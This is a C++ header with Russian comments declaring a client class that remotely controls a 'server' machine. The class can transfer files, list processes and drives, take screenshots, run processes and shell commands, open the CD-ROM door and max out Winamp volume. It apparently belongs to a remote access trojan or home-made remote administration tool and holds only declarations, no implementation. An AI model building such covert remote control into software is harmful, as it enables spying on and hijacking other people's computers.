#pragma once

#include <winsock2.h>
#include <vector>
#include "pstring.hpp"
#include "strlist.h"

namespace PUSHKIN_CLIENT
{
   // Класс - клиент (поддерживает соединение)
   class CPushkinClient
   {
      SOCKET       m_socket;         // Клиентский сокет
      sockaddr_in  m_server_addr;    // Адрес сервера
      String       m_err_msg;        // Буфер для сообщений об ошибках
      int          m_err_code;       // Код последней ошибки
      int          m_server_version; // Вермия сервера

      // Данные для переконнекчивания с сервером
      char         m_connect_addr[32];
      int          m_connect_port;
      char         m_prev_login[21];
      char         m_prev_pwd[21];

      void InitStructures();

      // Работа с сервером
      int ReceiveGreeting();           // Получение приветствия от сервера

   public:
      CPushkinClient();                   // Конструктор по умолчанию
      CPushkinClient(CPushkinClient &cl); // Конструктор копирования
      ~CPushkinClient();                  // Деструктор

      // Получение информации о последней ошибке
      const char *GetErrorMessage() {return m_err_msg.c_str();}
      int         GetErrorCode() {return m_err_code;}
      int         GetVersion() {return m_server_version;}

      int Connect(const char *IP, int port);  // Подключение к серверу
      void Disconnect();                      // Отключение от сервера

      // Выполнение действий
      int SendCommand(UINT code);                    // Отсылает команду
      int Login(const char *login, const char *pwd); // Авторизация на сервере
      int ShutdownServer();                          // Отключение сервера и, соответственно, автоматический дисконнект
      int GetFile(const char *fname, const char *fname_dest); // Получение файла с сервера
      int GetServerVersion(UINT &ver);               // Получение версии сервера
      int UpdateServer(const char *new_serv_name);   // Обновление сервера до более новой версии
      int Reconnect();                               // Переконнекчивание по старому адресу
      int Relogin();                                 // Перелогонивание по старому логину и старому паролю
      int GetFileList(const char *path, std::vector<SFileInfo> &list);         // Получение списка файлов с сервера
      int GetDrivesList(UINT &drives);               // Получение списка логических дисков
      int SendMessage(const char*,const char*,int,int b_async=0);  // Отсылка сообщения серверу (показ на экране)
      int GetProcessList(std::vector<SFileInfo> &list); // Получение списка процессов
      int OpenCDDoor(UINT b_open);                   // Открыть дверцу CD-ROM
      int GetScreenShot(const char *file_name);      // Получить фотографию экрана
      int SendFile(const char *path, const char *dest_path); // Отослать файл на сервер
      int ServCreateProcess(const char *cmd_line, const char *working_dir); // Запустить процесс на сервере
      int MaximizeWinampVolume();                    // Увеличить звук Winamp'a до максимума
      int GetFilesTree(const char *path, const char *add_s, std::vector<SFileInfo> &list, __int64 &total_size); // Получение дерева файлов и каталогов
      int GetFilesList(const char *add_s, vector<SFileInfo> &list_in, const char *dest_path);  // Получение файлов списком
      int ServShellExecute(const char *operation, const char *file, const char *dir);  // Выполнение функции ShellExecute на сервере
      int GetServFreeSpace(const char *path, __int64 &free_space);         // Получение свободного места на сервере
      int SendFileDirect(const char *src, const char *dest); // Прямое копирование файлов - минуя клиента
      int GetFileEx(const char *src, const char *dest);  // Докачка файла

      // Асинхронное получение файлов
      int (*BlockReadCallback)(DWORD bytes);            // Внешняя функция. Используется в GetFile()
      int (*ReceivingFileCallback)(const char *fname);  // Внешняя функция. Используется в GetFilesList();
      int (*ErrReceivingFileCallback)(const char *msg, const char *fname);  // Внешняя функция, показывающая ошибку скачивания файла
   };
}
